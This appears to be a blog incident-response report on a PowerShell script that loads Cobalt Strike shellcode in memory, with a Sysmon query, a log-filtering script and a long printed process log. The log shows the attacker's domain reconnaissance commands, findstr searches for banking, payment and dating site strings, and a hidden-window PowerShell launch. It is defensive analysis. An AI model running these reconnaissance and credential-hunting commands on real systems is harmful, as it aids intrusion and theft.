---
title: "Investigating a Suspicious PowerShell Script Execution"
date: 2023-12-26
categories: [Incident Response, Powershell]
tags: [Windows, Powershell, Incident Response, Malware Analysis]
image:
  path: /assets/img/analyzing-suspicious-powershell-execution/digital-forensics.png
--- 

## Alert

This report presents the preliminary analysis conducted following the detection of a suspicious PowerShell script execution. The incident transpired on September 5, 2021, at 12:43 PM. Alert indicates potential malicious PowerShell script execution, immediate action has been taken to download and analyze the suspicious file. Should the analysis reveal malicious content, it will initiate the incident response process.

## Malware Analysis

### Stage1

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled1.png)

In Stage 1 of the malware analysis, the suspicious **`end.ps1`** script was downloaded and analyzed. Upon examination, it was discovered that the script contained a lengthy Base64-encoded string. To proceed with caution, instead of using the potentially malicious **`IEX`** (Invoke-Expression) command, the decision was made to replace it with **`echo`** in order to mitigate risks. This substitution allowed for the transition to Stage 2 of the malware process.

### Stage2

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled2.png)

Similar approach was applied as in Stage 1. To ensure safety and avoid potentially executing malicious code, the **`IEX`** (Invoke-Expression) command in the suspicious **`end.ps1`** script was replaced with the **`echo`** command.

### Stage3

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled3.png)

1. The code allocated memory using the **`VirtualAlloc`** function from kernel32.dll. This function allowed the script to create a new executable memory region in the system's memory space.
2. Following memory allocation, the script copied a block of code, presumably shellcode, into the allocated memory region. The variable **`Svar_code`** held this block of code.
3. The script then created a delegate for a function pointer, enabling the execution of code within the allocated memory. This delegate was set up to execute the code located in the allocated memory space.
4. Finally, the script invoked the delegate, triggering the execution of the shellcode within the allocated memory. This technique allowed the attacker to execute code without writing it directly to disk, which can make it harder to detect.

```powershell
[System.IO.File]::WriteAllBytes($filePath, $var_code)
```

The line of code was employed to write the contents of the **`$var_code`** variable to a file named "a.txt" in the file system. This decision was a cautious approach to avoid executing potentially malicious code directly. It allowed us to preserve the code for examination while also providing the opportunity to calculate its hash and check it against VirusTotal for any indications of malicious behavior. This approach aligns with best practices in handling potentially malicious code during incident response, ensuring thorough analysis and minimizing risks to the system.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled4.png)

When we opened the saved file using HxD, we observed the presence of the text `This program cannot be run in DOS mode`. This indicator strongly suggested that the file is an executable.

### VirusTotal

Lastly, we employed the 'certutil' utility to calculate the MD5 hash of the file, which allowed us to obtain a unique identifier for the file. 

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled5.png)

Subsequently, we submitted this hash to VirusTotal for analysis. The results from VirusTotal confirmed that the file indeed contained Cobalt Strike shellcode, providing conclusive evidence of malicious intent.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled6.png)

With our confirmation that the running code was indeed Cobalt Strike, we initiated the incident response process.

## Incident Response

At the outset of the malware analysis process, we commenced our investigation based on the knowledge that 'end.ps1' had executed Cobalt Strike and was identified as malicious. So we initiated our investigation by executing the following Sysmon query to identify the event related to the execution of 'end.ps1':

```xml
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-Sysmon/Operational">
    <Select Path="Microsoft-Windows-Sysmon/Operational">
        *[System[(EventID=1)]] and *[EventData[Data[@Name='OriginalFileName'] = 'powershell.exe']]
    </Select>
  </Query>
</QueryList>
```

This query led us to an event where the command line executed was `powershell -w hidden -nop end.ps1`. Knowing `end.ps1` to be malicious, we proceeded to gather more context.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled7.png)

### Correlation Data Analysis

We identified three critical pieces of correlation data from the event:

1. **TerminalSessionId: 2**
    - This ID usually indicates a Remote Desktop session, suggesting the activity might have originated remotely. Remote Desktop is a common vector for both legitimate administration and malicious access.
2. **LogonGuid: {a584806d-b41f-6134-88cd-760000000000}**
    - This GUID is useful for tracing the session's activities across the network. It's especially valuable in understanding the authentication mechanism used to initiate the session.

Upon using the "Ctrl+F" search functionality with the Logon GUID as the search parameter, I discovered an event that caught my attention:

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled8.png)

In the course of examining the event logs, a significant discovery was made when a specific event revealed the execution of **`notepad.exe`** to open a **`readme.txt`** file located in the **`nc111nt`** directory. This directory's name was particularly intriguing and warranted further investigation. A search on the internet for **`nc111nt`** led to the identification of a repository named `Netcat for Windows`.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled9.png)

Netcat is a well-known utility used in networking for reading from and writing to network connections using TCP or UDP. It's often used by attackers for a variety of purposes including shell creation, port scanning, and network debugging.

The IP address(`3.16.42.241`) in the previous event further supports this hypothesis and points towards network-based activity, possibly indicating command and control communication or data exfiltration.

The session in question, identified by the Logon GUID **`{a584806d-b41f-6134-88cd-760000000000}`**, has shown clear signs of suspicious activity, notably the execution of Netcat, a common tool used for network exploitation. To gain a comprehensive understanding of the breadth of activities within this session, a manual review of each process is inefficient and time-consuming. Instead, a targeted approach using a PowerShell script below is proposed.

```powershell
$LogonGUID = "{a584806d-b41f-6134-88cd-760000000000}"
$filteredEvents = Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | ForEach-Object {
    $eventXml = [xml]$_.ToXml()
    $logonGuidInEvent = $eventXml.Event.EventData.Data | Where-Object { $_.Name -eq 'LogonGuid' } | Select-Object -ExpandProperty '#text'

    if ($logonGuidInEvent -eq $LogonGUID) {
        $commandLine = $eventXml.Event.EventData.Data | Where-Object { $_.Name -eq 'CommandLine' } | Select-Object -ExpandProperty '#text'
        $parentCommandLine = $eventXml.Event.EventData.Data | Where-Object { $_.Name -eq 'ParentCommandLine' } | Select-Object -ExpandProperty '#text'

        $commandLine = ($commandLine -replace "`r`n", " " -replace "`n", " ").Trim()
        $parentCommandLine = ($parentCommandLine -replace "`r`n", " " -replace "`n", " ").Trim()

        $singleLine = "{0},  {1},  {2},  {3}" -f $_.TimeCreated.ToString("o"), $_.Id, $commandLine, $parentCommandLine
        $singleLine -replace '\s+', ' '
    }
}

$filteredEvents | Sort-Object | Out-File -FilePath "C:\Users\Mustafa\Desktop\commands.txt" -Encoding UTF8
```

Upon retrieving the output from the PowerShell script, it's essential to understand that the data will encompass both standard and potentially malicious processes. This mixture is expected due to the nature of system logs, which capture all activities indiscriminately. The challenge lies in discerning the benign from the malevolent, a critical step in any thorough cybersecurity investigation.

```powershell
Time, Event ID, CommandLine, Parent CommandLine
2021-09-05T12:12:15.4640517+00:00, 1, C:\Windows\system32\TSTheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:12:15.5160337+00:00, 1, rdpclip, C:\Windows\System32\svchost.exe -k termsvcs -s TermService
2021-09-05T12:12:15.6028514+00:00, 1, sihost.exe, C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager
2021-09-05T12:12:15.6068057+00:00, 1, C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc, C:\Windows\system32\services.exe
2021-09-05T12:12:15.6476137+00:00, 1, C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService, C:\Windows\system32\services.exe
2021-09-05T12:12:15.7006291+00:00, 1, taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:12:15.7224590+00:00, 1, taskhostw.exe USER, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:12:15.7503810+00:00, 1, C:\Windows\system32\ServerManagerLauncher.exe, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:12:15.7512157+00:00, 1, taskhostw.exe, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:12:15.9105642+00:00, 1, C:\Windows\system32\userinit.exe, winlogon.exe
2021-09-05T12:12:15.9911534+00:00, 1, C:\Windows\Explorer.EXE, C:\Windows\system32\userinit.exe
2021-09-05T12:12:17.7587457+00:00, 1, "ctfmon.exe", C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TabletInputService
2021-09-05T12:12:27.8521901+00:00, 1, C:\Windows\System32\smartscreen.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:12:27.9015562+00:00, 1, "C:\Windows\System32\SecurityHealthSystray.exe", C:\Windows\Explorer.EXE
2021-09-05T12:12:27.9542437+00:00, 1, "C:\Program Files\TightVNC\tvnserver.exe" -controlservice -slave, C:\Windows\Explorer.EXE
2021-09-05T12:12:28.3916340+00:00, 1, C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RunWallpaperSetup.cmd" ", C:\Windows\Explorer.EXE
2021-09-05T12:12:28.5445951+00:00, 1, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "Import-Module "C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Ec2Launch.psd1"; Set-Wallpaper", C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RunWallpaperSetup.cmd" "
2021-09-05T12:12:31.7886958+00:00, 1, "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\h5p0ebet\h5p0ebet.cmdline", C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "Import-Module "C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Ec2Launch.psd1"; Set-Wallpaper"
2021-09-05T12:12:31.8664634+00:00, 1, C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RES412.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\h5p0ebet\CSC20E22C7188594983B539C301F46FFF9.TMP", "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\h5p0ebet\h5p0ebet.cmdline"
2021-09-05T12:14:53.0359408+00:00, 1, C:\Windows\system32\T{a584806d-b41f-6134-88cd-760000000000}STheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:14:53.1498061+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:16:25.9503972+00:00, 1, C:\Windows\system32\TSTheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:16:26.2426021+00:00, 1, rdpclip, C:\Windows\System32\svchost.exe -k termsvcs -s TermService
2021-09-05T12:16:26.7216182+00:00, 1, atbroker.exe, winlogon.exe
2021-09-05T12:16:26.7315580+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:18:02.3191406+00:00, 1, "C:\Windows\ImmersiveControlPanel\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:18:02.3197860+00:00, 1, C:\Windows\system32\ApplicationFrameHost.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:18:04.1298642+00:00, 1, C:\Windows\System32\Speech_OneCore\Common\SpeechRuntime.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:19:38.2055869+00:00, 1, "C:\Windows\system32\cmd.exe", C:\Windows\Explorer.EXE
2021-09-05T12:25:42.0045414+00:00, 1, certutil.exe, "C:\Windows\system32\cmd.exe"
2021-09-05T12:27:16.2032292+00:00, 1, taskhostw.exe Install $(Arg0), C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:27:23.3542838+00:00, 1, C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:27:24.6109516+00:00, 1, "C:\Windows\system32\cmd.exe", C:\Windows\Explorer.EXE
2021-09-05T12:28:48.6303933+00:00, 1, "C:\Program Files\Google\Chrome\Application\chrome.exe", C:\Windows\Explorer.EXE
2021-09-05T12:28:49.3879566+00:00, 1, C:\Windows\System32\CompPkgSrv.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:28:52.2738393+00:00, 1, "C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\SwReporter\92.267.200\software_reporter_tool.exe" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=ZDnVqSUDQs9efPL6zwl2/lxA0yUucqkVxCIgUbh8 --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment, "C:\Program Files\Google\Chrome\Application\chrome.exe"
2021-09-05T12:28:52.3323619+00:00, 1, "c:\users\administrator\appdata\local\google\chrome\user data\swreporter\92.267.200\software_reporter_tool.exe" --crash-handler "--database=c:\users\administrator\appdata\local\Google\Software Reporter Tool" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=92.267.200 --initial-client-data=0x294,0x298,0x29c,0x270,0x2a0,0x7ff6513162b0,0x7ff6513162c0,0x7ff6513162d0, "C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\SwReporter\92.267.200\software_reporter_tool.exe" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=ZDnVqSUDQs9efPL6zwl2/lxA0yUucqkVxCIgUbh8 --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment
2021-09-05T12:28:52.4785880+00:00, 1, "c:\users\administrator\appdata\local\google\chrome\user data\swreporter\92.267.200\software_reporter_tool.exe" --enable-crash-reporting --use-crash-handler-with-id="\\.\pipe\crashpad_4580_PBIKCOENFOTJQISU" --sandboxed-process-id=2 --init-done-notifier=792 --sandbox-mojo-pipe-token=8000954298550804329 --mojo-platform-channel-handle=756 --engine=2, "C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\SwReporter\92.267.200\software_reporter_tool.exe" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=ZDnVqSUDQs9efPL6zwl2/lxA0yUucqkVxCIgUbh8 --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment
2021-09-05T12:28:53.2220605+00:00, 1, "c:\users\administrator\appdata\local\google\chrome\user data\swreporter\92.267.200\software_reporter_tool.exe" --enable-crash-reporting --use-crash-handler-with-id="\\.\pipe\crashpad_4580_PBIKCOENFOTJQISU" --sandboxed-process-id=3 --init-done-notifier=1020 --sandbox-mojo-pipe-token=12118169644425716287 --mojo-platform-channel-handle=1016, "C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\SwReporter\92.267.200\software_reporter_tool.exe" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=ZDnVqSUDQs9efPL6zwl2/lxA0yUucqkVxCIgUbh8 --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment
2021-09-05T12:29:58.7745788+00:00, 1, "C:\Windows\system32\notepad.exe", C:\Windows\Explorer.EXE
2021-09-05T12:31:03.8084192+00:00, 1, cmd.exe new1.bat, "C:\Windows\system32\cmd.exe"
2021-09-05T12:31:21.1660301+00:00, 1, nltest /domain_trusts, cmd.exe new1.bat
2021-09-05T12:31:21.1952914+00:00, 1, net view /all, cmd.exe new1.bat
2021-09-05T12:31:33.3000905+00:00, 1, reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, cmd.exe new1.bat
2021-09-05T12:31:33.3367931+00:00, 1, net view /all /domain, cmd.exe new1.bat
2021-09-05T12:31:45.4487600+00:00, 1, net group "domain admins" /domain, cmd.exe new1.bat
2021-09-05T12:31:45.4698009+00:00, 1, C:\Windows\system32\net1 group "domain admins" /domain, net group "domain admins" /domain
2021-09-05T12:31:45.4966263+00:00, 1, net session, cmd.exe new1.bat
2021-09-05T12:31:45.5080602+00:00, 1, C:\Windows\system32\net1 session, net session
2021-09-05T12:31:45.5326700+00:00, 1, net user, cmd.exe new1.bat
2021-09-05T12:31:45.5511284+00:00, 1, C:\Windows\system32\net1 user, net user
2021-09-05T12:31:45.5799266+00:00, 1, systeminfo, cmd.exe new1.bat
2021-09-05T12:31:50.0180596+00:00, 1, ipconfig /all, cmd.exe new1.bat
2021-09-05T12:31:50.1400010+00:00, 1, netstat -an, cmd.exe new1.bat
2021-09-05T12:31:50.4460146+00:00, 1, net config workstation, cmd.exe new1.bat
2021-09-05T12:31:50.4651337+00:00, 1, C:\Windows\system32\net1 config workstation, net config workstation
2021-09-05T12:31:50.5052026+00:00, 1, ipconfig, cmd.exe new1.bat
2021-09-05T12:31:50.5548538+00:00, 1, tasklist, cmd.exe new1.bat
2021-09-05T12:31:50.8863188+00:00, 1, findstr /m whoer.net *, cmd.exe new1.bat
2021-09-05T12:31:50.9270285+00:00, 1, findstr /m fedex.com *, cmd.exe new1.bat
2021-09-05T12:31:50.9550196+00:00, 1, findstr /m ups.com *, cmd.exe new1.bat
2021-09-05T12:31:50.9833356+00:00, 1, findstr /m sendspace.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0125906+00:00, 1, findstr /m indeed.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0420045+00:00, 1, findstr /m craiglist.org *, cmd.exe new1.bat
2021-09-05T12:31:51.0661670+00:00, 1, findstr /m swiftunlocks.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0943186+00:00, 1, findstr /m vzw.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1219193+00:00, 1, findstr /m verizonwireless.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1461812+00:00, 1, findstr /m verizon.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1731897+00:00, 1, findstr /m datehookup.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2029468+00:00, 1, findstr /m att.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2613480+00:00, 1, findstr /m datingdirect.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2882587+00:00, 1, findstr /m mail.live.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3054478+00:00, 1, findstr /m meetic.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3335354+00:00, 1, findstr /m lovearts.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3576931+00:00, 1, findstr /m amateurmatch.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3870739+00:00, 1, findstr /m meetme.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4428256+00:00, 1, findstr /m cupid.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4644904+00:00, 1, findstr /m accounts.google.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4921744+00:00, 1, findstr /m sprint.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5134180+00:00, 1, findstr /m login.yahoo.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5388885+00:00, 1, findstr /m muddymatches.co.uk *, cmd.exe new1.bat
2021-09-05T12:31:51.5668818+00:00, 1, findstr /m steampowered.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5920452+00:00, 1, findstr /m officedepot.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6170895+00:00, 1, findstr /m zoosk.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6401886+00:00, 1, findstr /m target.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6674999+00:00, 1, findstr /m match.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6966975+00:00, 1, findstr /m friendfinder.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7257782+00:00, 1, findstr /m mysinglefriend.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7517771+00:00, 1, findstr /m gay.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7744586+00:00, 1, findstr /m christianconnection.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8000385+00:00, 1, findstr /m shaadi.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8238720+00:00, 1, findstr /m jdate.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8471258+00:00, 1, findstr /m qvc.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8704098+00:00, 1, findstr /m apple.comdssid *, cmd.exe new1.bat
2021-09-05T12:31:51.8949001+00:00, 1, findstr /m beacon.walmart.com *, cmd.exe new1.bat
2021-09-05T12:31:51.9547018+00:00, 1, findstr /m lowes.com *, cmd.exe new1.bat
2021-09-05T12:31:51.9829683+00:00, 1, findstr /m dell.com *, cmd.exe new1.bat
2021-09-05T12:31:52.0098965+00:00, 1, findstr /m amazon.comsession *, cmd.exe new1.bat
2021-09-05T12:31:52.0401961+00:00, 1, findstr /m ebay.comnonsession *, cmd.exe new1.bat
2021-09-05T12:31:52.1102466+00:00, 1, findstr /m bestbuy.comcontext_id *, cmd.exe new1.bat
2021-09-05T12:31:52.1313873+00:00, 1, findstr /m farfetch.com *, cmd.exe new1.bat
2021-09-05T12:31:52.1578316+00:00, 1, findstr /m newegg.coms_per *, cmd.exe new1.bat
2021-09-05T12:31:52.1831523+00:00, 1, findstr /m bhphotovideo.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2037686+00:00, 1, findstr /m sears.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2294217+00:00, 1, findstr /m airbnb.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2583948+00:00, 1, findstr /m overstock.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2838589+00:00, 1, findstr /m perfectmoney.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3164280+00:00, 1, findstr /m aib.ie *, cmd.exe new1.bat
2021-09-05T12:31:52.3451621+00:00, 1, findstr /m moneybookers.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3690143+00:00, 1, findstr /m payeer.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3900271+00:00, 1, findstr /m open24.ie *, cmd.exe new1.bat
2021-09-05T12:31:52.4149289+00:00, 1, findstr /m liqpay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.4768769+00:00, 1, findstr /m barclaycardus.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5031539+00:00, 1, findstr /m coinbase.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5254478+00:00, 1, findstr /m chase.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5427721+00:00, 1, findstr /m capitalone.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5705149+00:00, 1, findstr /m paysurfer.com *, cmd.exe new1.bat
2021-09-05T12:31:52.6211631+00:00, 1, findstr /m wellsfargo.com *, cmd.exe new1.bat
2021-09-05T12:31:52.6487945+00:00, 1, findstr /m suntrust.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7217792+00:00, 1, findstr /m dwolla.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7463539+00:00, 1, findstr /m gopayment.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7641174+00:00, 1, findstr /m .v.me *, cmd.exe new1.bat
2021-09-05T12:31:52.7825803+00:00, 1, findstr /m westernunion.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8112823+00:00, 1, findstr /m paypal.comcookie_check *, cmd.exe new1.bat
2021-09-05T12:31:52.8324562+00:00, 1, findstr /m entropay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8719142+00:00, 1, findstr /m wepay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8990071+00:00, 1, findstr /m account.skrill.com *, cmd.exe new1.bat
2021-09-05T12:31:52.9203107+00:00, 1, findstr /m 2checkout.com *, cmd.exe new1.bat
2021-09-05T12:31:52.9556973+00:00, 1, findstr /m neteller.com *, cmd.exe new1.bat
2021-09-05T12:31:53.0111759+00:00, 1, findstr /m cookie_check.paypal.com *, cmd.exe new1.bat
2021-09-05T12:31:53.0465721+00:00, 1, C:\WINDOWS\system32\cmd.exe /S /D /c" TYPE win_install.log.txt ", cmd.exe new1.bat
2021-09-05T12:32:24.3645426+00:00, 1, ipconfig, cmd.exe new1.bat
2021-09-05T12:32:42.1712703+00:00, 1, "C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe", "C:\Program Files\Google\Chrome\Application\chrome.exe"
2021-09-05T12:32:42.9236418+00:00, 1, "C:\Users\ADMINI~1\AppData\Local\Temp\2\is-BNNEE.tmp\Advanced_Port_Scanner_2.5.3869.tmp" /SL5="$1102E2,19769177,139776,C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe", "C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe"
2021-09-05T12:33:05.2372213+00:00, 1, "C:\Users\ADMINI~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe" /portable "C:/Users/Administrator/Downloads/" /lng en_us, "C:\Users\ADMINI~1\AppData\Local\Temp\2\is-BNNEE.tmp\Advanced_Port_Scanner_2.5.3869.tmp" /SL5="$1102E2,19769177,139776,C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe"
2021-09-05T12:39:14.9126030+00:00, 1, "C:\Windows\System32\explorer.exe" \\172.31.23.102, "C:\Users\ADMINI~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe" /portable "C:/Users/Administrator/Downloads/" /lng en_us
2021-09-05T12:39:15.0086384+00:00, 1, C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:39:15.3287976+00:00, 1, "C:\Windows\System32\CredentialUIBroker.exe" NonAppContainerFailedMip -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:39:49.2241641+00:00, 1, C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:40:25.8529078+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", C:\Windows\Explorer.EXE
2021-09-05T12:43:23.0839733+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:43:45.3925137+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:44:06.8425008+00:00, 1, "C:\Windows\system32\NOTEPAD.EXE" C:\Users\Public\Documents\endpoint.txt, C:\Windows\Explorer.EXE
2021-09-05T12:45:00.4355424+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:47:42.0709584+00:00, 1, "C:\Windows\regedit.exe", C:\Windows\Explorer.EXE
2021-09-05T12:48:41.5259764+00:00, 1, "C:\Windows\ImmersiveControlPanel\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:48:42.2437324+00:00, 1, C:\Windows\System32\Speech_OneCore\Common\SpeechRuntime.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:49:11.2936537+00:00, 1, C:\Windows\system32\TSTheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:49:11.4033321+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:49:12.0246028+00:00, 1, rdpclip, C:\Windows\System32\svchost.exe -k termsvcs -s TermService
2021-09-05T12:49:12.5415232+00:00, 1, atbroker.exe, winlogon.exe
2021-09-05T12:49:12.7068810+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:49:23.2511499+00:00, 1, C:\Windows\system32\TSTheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:49:23.6008229+00:00, 1, rdpclip, C:\Windows\System32\svchost.exe -k termsvcs -s TermService
2021-09-05T12:49:24.1505175+00:00, 1, atbroker.exe, winlogon.exe
2021-09-05T12:49:24.1519744+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T12:49:31.1083835+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:50:09.8753361+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -nop .\end.ps1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
2021-09-05T12:50:12.3726334+00:00, 1, "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -nop .\end.ps1
